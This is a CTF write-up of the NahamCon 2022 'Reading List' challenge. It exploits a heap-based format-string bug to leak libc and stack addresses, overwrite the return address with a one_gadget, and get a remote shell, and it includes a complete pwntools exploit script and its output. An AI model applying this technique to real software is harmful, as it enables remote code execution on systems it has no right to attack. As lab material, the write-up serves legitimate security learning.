# NahamCon CTF 2022

## Reading List

> Try out my new reading list maker! Keep track of what books you would like to read. 
>
> Author: @M_alpha#3534
>
> [`reading_list`](reading_list) [`libc-2.31.so`](libc-2.31.so) [`Dockerfile`](Dockerfile)

Tags: _pwn_ _x86-64_ _format-string_ _remote-shell_ _one-gadget_


## Summary

Format-string _not in stack_ challenge.

> Normally format-string challenges are stupid simple if the buffer is on stack, but in this case, it is not, so a bit more work.

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.  Nice!  Thank you!

> BTW, you get all this sweet sweet security for free with `gcc -O2`.


### Ghidra Decompile

```c
void print_list(undefined8 param_1)
{
  int local_c;
  
  if (booklist._8_8_ == 0) {
    puts("No books in the list");
  }
  else {
    printf("%s\'s reading list\n",param_1);
    for (local_c = 0; (ulong)(long)local_c < booklist._8_8_; local_c = local_c + 1) {
      printf("%d. ",(ulong)(local_c + 1));
      printf(*(char **)(booklist._0_8_ + (long)local_c * 8));
      puts("");
    }
  }
  puts("");
  return;
}
```

`printf(*(char **)(booklist._0_8_ + (long)local_c * 8));` is the vulnerably--no format-string.  However, the book names are on the heap and not in the stack.  Fortunately, _your_ name is on the stack and you can change _your_ name:

```
gef➤  b *print_list+173
Breakpoint 1 at 0x1484
gef➤  run
Starting program: /pwd/datajerk/nahamconctf2022/reading_list/reading_list
What is your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
Hello: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa!

1. Print reading list
2. Add book to reading list
3. Remove book from reading list
4. Change your name

> 2
Enter the book name: %p
1. Print reading list
2. Add book to reading list
3. Remove book from reading list
4. Change your name

> 1
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa's reading list
1. 0x7fffffffbc10
```

> Above we're setting a breakpoint after the final `printf` in `print_list`.

Note above that our book name was `%p`, however `print_list` returns as the value in register `rsi` (the first parameter passed to a format-string) _before_ `printf` is called.

More import, look at our _name_ on the stack:

```
0x00007fffffffe2b0│+0x0000: 0x00005555555551c0  →  <_start+0> endbr64 	 ← $rsp
0x00007fffffffe2b8│+0x0008: 0x00007fffffffe2f0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa"
0x00007fffffffe2c0│+0x0010: 0x0000000000000000
0x00007fffffffe2c8│+0x0018: 0x00000001872e9a00
0x00007fffffffe2d0│+0x0020: 0x00007fffffffe330  →  0x0000000000000000	 ← $rbp
0x00007fffffffe2d8│+0x0028: 0x00005555555557e4  →  <main+171> jmp 0x555555555815 <main+220>
0x00007fffffffe2e0│+0x0030: 0x00007fffffffe428  →  0x00007fffffffe6b9  →  "/pwd/datajerk/nahamconctf2022/reading_list/reading[...]"
0x00007fffffffe2e8│+0x0038: 0x01005555555552d9
0x00007fffffffe2f0│+0x0040: "aaaabaaa"
0x00007fffffffe2f8│+0x0048: "caaadaaa"
0x00007fffffffe300│+0x0050: "eaaafaaa"
0x00007fffffffe308│+0x0058: "gaaahaaa"
0x00007fffffffe310│+0x0060: "iaaajaaa"
0x00007fffffffe318│+0x0068: "kaaalaaa"
0x00007fffffffe320│+0x0070: 0x00007fffffff0000  →  0x0000000000000000
0x00007fffffffe328│+0x0078: 0xb91f879e872e9a00
0x00007fffffffe330│+0x0080: 0x0000000000000000
0x00007fffffffe338│+0x0088: 0x00007ffff7de40b3  →  <__libc_start_main+243> mov edi, eax
```

The `fgets` in `get_name` maxes out at `48` chars, or in our case 6 stack lines, giving us 6 locations we can use with our format-string exploit.

Also on stack is a stack leak at `+0x8` and a libc leak at `+0x88`.  These equate to format-string parameters `7` and `23` (x86_64 format-strings parameters > 5 start at `rsp` and increase one/stack line, e.g. to compute libc format-string parameter: `6 + 0x88 / 8 = 23`.  Our _name_ starts at format-string parameter `14` (you do the math).

With the stack leak we can compute the value of `rsp`.  Add `0x28` to that and we have the location of the return address (look at the stack above).

With 6 addresses we can write out a 2 or 3 statement ROP chain.  2 if we limit ourselves to `short` (16-bit) writes, and 3 if we use `int` (32-bit) writes.  If one_gadget is an option we can do this with a single ROP chain statement.

To check if one_gadget is an option, run it:

```bash
# one_gadget libc-2.31.so
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Three options, each option requires a pair of NULL registers, to see if we have a match set a break point at the `print_list` `ret`, and dump the registers in question:

```
gef➤  b *print_list+187
Breakpoint 2 at 0x555555555492
gef➤  c
Continuing.
gef➤  i r r15 r12 rdx rsi
r15            0x0                 0x0
r12            0x5555555551c0      0x5555555551c0
rdx            0x0                 0x0
rsi            0x7ffff7fad723      0x7ffff7fad723
```

Looks like the second one_gadget is an option, both `r15` and `rdx` are NULL at `ret`.

We have everything we need.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./reading_list', checksec=False)

if args.REMOTE:
    libc = ELF('libc-2.31.so', checksec=False)
    libc.symbols['gadget'] = 0xe3b31
    libc_start_main_offset = 243
    p = remote('challenge.nahamcon.com', 30933)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    libc.symbols['gadget'] = 0xe3b31
    libc_start_main_offset = 243
    p = process(binary.path)

p.sendlineafter(b'name: ', b'foo')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'name: ', b'%23$018p %7$018p')
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'1. ')
_ = p.recvline().strip().decode().split()
libc.address = int(_[0],16) - libc.sym.__libc_start_main - libc_start_main_offset
rsp = int(_[1],16) - 0x40
ret = rsp + 0x28

log.info('libc.address: {x}'.format(x = hex(libc.address)))
log.info('libc.sym.gadget: {x}'.format(x = hex(libc.sym.gadget)))
log.info('rsp: {x}'.format(x = hex(rsp)))
log.info('ret: {x}'.format(x = hex(ret)))
```

We start by leaking libc and the stack, then computing the locations of libc and the return address.

> If you do not understand why 23, 7, 243, 0x40, and 0x28, look at the stack above in the Analysis section.

```python
payload = b''
for i in range(3): payload += p64(ret + i*2)

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'name: ', payload)
```

With the location of the return address known, we can change our _name_ so that the 3 shorts that make up the 48-bit address of the return address can be set on the stack to be used by our format-string attack.

```python
offset = 14
for i in range(3):
    payload = b'%' + str((libc.sym.gadget >> i*16) & 0xFFFF).encode() + b'c%' + str(offset + i).encode() + b'$n'
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'name: ', payload)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'name: ', b'bookend')
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'bookend\n')
p.interactive()
```

Add three more books to our list, each book will emit a 16-bit integer of spaces to be counted by `printf` and stored into the locations set by our _name_, IOW the return address.

> The 4th book (`bookend`) is there just as something to wait for to avoid filling the screen with garbage (so we can have nice things like pretty write ups).

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to challenge.nahamcon.com on port 30933: Done
[*] libc.address: 0x7faee88ad000
[*] libc.sym.gadget: 0x7faee8990b31
[*] rsp: 0x7fff7315faa0
[*] ret: 0x7fff7315fac8
[*] Switching to interactive mode

$ cat flag.txt
flag{1b0d16889d3b8a1cb31232763b51a03d}
```
